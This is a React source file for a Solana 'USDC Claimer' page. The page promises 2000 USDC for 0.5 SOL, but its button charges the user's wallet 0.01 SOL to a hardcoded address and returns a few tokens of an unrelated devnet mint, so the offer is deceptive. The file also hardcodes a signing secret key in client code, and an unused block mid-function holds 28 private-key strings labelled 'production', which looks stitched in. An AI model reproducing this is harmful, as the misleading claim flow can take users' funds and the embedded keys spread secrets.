/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "517rFqBshrXFVrDcZbMpSz4S4jaNPrXaGFPpVJkDH2Q6qnRrbtDETiaV9ML51etb94bqoh4U543wPDe6DBz8wBue"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "zM1W6nRmo5dt2ijrwseuNXPbs1WpGPaUaj6b78FpZuhzmjSmTNipotufoMtQs8YZsSPusx1H2fLjhMmnfk8fqLt",
  "key1": "zncc7ShPXPbqmdZe4r8deEv5mH28YAv7wKMH3CjpnJDZ86ncyVdwb3Dn1hswktBhXoueDJMkUTV45ZD97LdDFFV",
  "key2": "2CMAcV82wp4Ei8EoNJot6EKgcza5rvHosPBuCrjrpKtk5u5cWbRxrmzMEiSpMzaEP6dJddyjaj9nJUGzupjgKjNn",
  "key3": "4XnFMWjq3E5UJcYvcV5F5yTR4GCdAYMAYySRV3jRnZWyXdkB55YxZwk4iQzScwDeWELS4NNAdTcn2qkpq2sR8gS",
  "key4": "4KcSzhnaM5SK8VS4UvyTiMx9CMEnmokdcJ35StT4tDjVwFSX5dA9h2VuefFKyZcvSXvNM8ZtH7xutk9Yz6vosF4t",
  "key5": "3Xc3Meg8UiCV1ghLQdsjXJgsMCF5q99FnwZWV5ABj361jZVN6tRXE3B9zGRoVy3eNoEUjKicjJuNF93hHdJFTfsV",
  "key6": "2c1sXU4TU2oWKV2cSNEwvK5FVE6t4A4VmYex3zBrHpL5XhbRWVmxsi7fdkFv7YcricxGANqeUVh5r58YEE3pRUKx",
  "key7": "2dxdNoU22aRBe5vHy4gYNejF5hAr9QnG4SC7kBFYRthornyoaLMBfFpsoafrVhcyZmRQ6yJRiyjuvGqxTb3iduji",
  "key8": "FbTMHsFMTyGH4DqPzc9MzLb2UNfk4qHhBTuvoLLg4FCUWN4koSyMJ9AzMK3ThKETsuVtoTkMJVVWSx8iryNtpua",
  "key9": "N2Zpt3bKV8ZtsUdaSyAZDnf1DHJB6FXGo4fc7iUZ8N2kWQRqQSFSn6c12CPmMQWMUSCefEAdgT4c2mg2rKxUf1s",
  "key10": "FyxcgCYmUaT5nEtv1zKgYCGNisArbzzbP1QevRqmbGzKkdD8trJ5uhaR7XtkGtJ8zeqzzmV3Pixvw2PbcM88Jog",
  "key11": "2YmXBVfSUWmAPSLL2i1iREsMbVdmQF2tLMA3gBd6uz2isHPf38dE4vDddccjNrhahZVtyoNEfSLcPCjcuUTV7p95",
  "key12": "4KFDpyKNmWcLHF3oELLe2fvqff8u3sEBCb1sogF2yn7LuDZdssWnuRmxb1XjVLjMYDLtswHYfryEV1YwiRMq32MJ",
  "key13": "4aSx1JGTcGViS7ZWfbLgpA6zDbTypM8i92juYU3SCSErex3Hibd6RmMhXoqkrnSuTkmkQ2vT1CAwJfmGgD853Wk",
  "key14": "4mnwoiEceBBGJCrXDg6WNNHTpUA8ALS9qVb24GYConDHTTvFeDLZCGG2Dh91Rg6VkDH2gWXUQEz5MBbBA47ae9Zd",
  "key15": "3uu4AXMt36qW3awAFkzBXZ1iHmZhNrC3iTRGJ2wVQtv4KV3rRCMLq7sx6MPHtsPkgHzggSHQF2b3YHKqnvjB6FS3",
  "key16": "46xL3wQ2EFMeWMdwLgnWAJcaCMjXGFtikUe7ArRuLyNScYNQU4DUCwifYDoPChrGksYGvCDzM3yv8UgJwJrhK5QE",
  "key17": "28ywzbmJFmWh6F9cmoNjrt1sPruLbDi5XjEQUxBfBQfmRSTCba6DXoog6y2SMvfNBWtiNrKqWCoj4xTU4GcDyp1c",
  "key18": "2JcnFBAWae4rXo19dDQHzAFACXxf6neK8uqqaK7wTZbuqU3XMuqe3W8Jsyp5keZZvRaHpF1Yd3MfRiBhCeZJWTt4",
  "key19": "26rNd19kUAWZN2NYqB4BkBRFXZPMdJRA7rBew1B6yxNHr9SbnvKTycRSwkcgEeigcFM9LK1dEHmvEDFiXM8p4c4S",
  "key20": "5g1xSWTTKDm433P7zg52ZcK8AmM1jijtHQDdYp6UHU5cq1TjeF59GBj9Mv5zP2awwtdfuL7gywbmnzuj1Ujtw9Q8",
  "key21": "56pfpxh1aTCP8QyouzoUAb2ckvVnHzMXb5c19uw6bF9nvQLRpZeHB2kRwkQni8poWom3GZAP5GHzPt3YuFNQcnY9",
  "key22": "43hLRvcb5xpfPGSSA4Za7yUDoyD2j9P1QDXN7rZcQDwNHpHjfvuAbUSidjYCkC8PCFjSoMgmoLjcXdQ1wCPf1BGK",
  "key23": "MeRMXYMafLNeoHCzzvXqjQL8yth7KTMNS2yY3Fm6tQ3RhYjrGUVKTmg6RUqaFN3p2hcyeuxFyDCmu2uAYEkXJse",
  "key24": "QeCJpazdwZoiMtTYZZYrFf5WJRi3zZRfA8LkLEaVyubTyNK3j3paCX53nip8z4sj4WeHTAQhxtvKZrn4TcivNmV",
  "key25": "3AVKnT84vr3aaUi2fHeemNRwUq7HUEaNRYPJE6M7PuHH3SeqQHug9KzSHFmh2ksjt7qqTSJT9TgVWGa7E6Z4Hz3f",
  "key26": "5qazMQuCMpXnf876HDmhhJ1ZxRLvtJJ84QxZFjh7jjCThfPt2R8hRzYQBxiMzFagUVzTQqCoySY3mTVMk6eBZPP6",
  "key27": "4Thqgrnd3ukwwaRgRsuk4UjmzS5aNdFrJnnVY4iknN3sysubk8p9KyXwvRX3MVUwrvb7QBogwH5wU89GWwmoeSiT"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
